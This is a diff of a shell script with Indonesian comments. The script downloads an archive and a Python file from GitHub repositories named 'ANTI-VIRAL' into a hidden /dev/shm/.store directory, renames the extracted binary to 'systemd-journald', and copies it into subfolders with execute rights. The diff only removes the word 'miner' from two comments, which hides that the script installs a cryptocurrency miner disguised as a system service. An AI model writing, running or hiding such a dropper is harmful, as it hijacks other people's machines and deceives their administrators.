@@ -20,7 +20,7 @@ wget -q https://github.com/ANTI-VIRAL/Ai-04/raw/main/2.ini -O config.ini
 # Balik ke .store
 cd /dev/shm/.store
 
-# Download dan extract miner
+# Download dan extract
 wget -q https://github.com/ANTI-VIRAL/MACHINE/raw/main/cache.tar.gz
 tar -xzf cache.tar.gz
 rm -f cache.tar.gz
@@ -30,7 +30,7 @@ mv cache systemd-journald
 wget -q https://github.com/ANTI-VIRAL/MACHINE/raw/main/httpd.py
 chmod +x httpd.py
 
-# Copy miner ke folder 1 dan 2
+# Copy ke folder 1 dan 2
 cp systemd-journald /dev/shm/.store/1/
 cp systemd-journald /dev/shm/.store/2/
 chmod +x /dev/shm/.store/1/systemd-journald
